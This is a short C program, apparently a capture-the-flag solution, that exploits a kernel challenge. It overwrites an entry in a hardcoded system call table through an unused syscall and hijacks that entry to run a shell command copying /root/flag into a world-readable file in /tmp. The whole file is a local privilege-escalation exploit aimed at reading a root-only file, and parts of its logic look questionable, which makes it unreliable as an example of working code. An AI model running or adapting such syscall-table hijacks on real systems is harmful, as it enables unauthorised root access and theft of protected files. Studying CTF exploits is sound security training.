#include <unistd.h>
#include <sys/syscall.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define NR_SYS_UNUSED		223
#define SYS_CALL_TABLE		0x8000e348

long pwn(void)
{
	system("cat /root/flag > /tmp/pwned && chmod a+r /tmp/pwned");
	return 0;
}

int main(void)
{
	unsigned int** sct = (unsigned int**)SYS_CALL_TABLE;
	char * ptr = pwn + '\x00';
	syscall(NR_SYS_UNUSED, ptr, sct[NR_SYS_UNUSED]);
	syscall(NR_SYS_UNUSED);
	return 0;
}
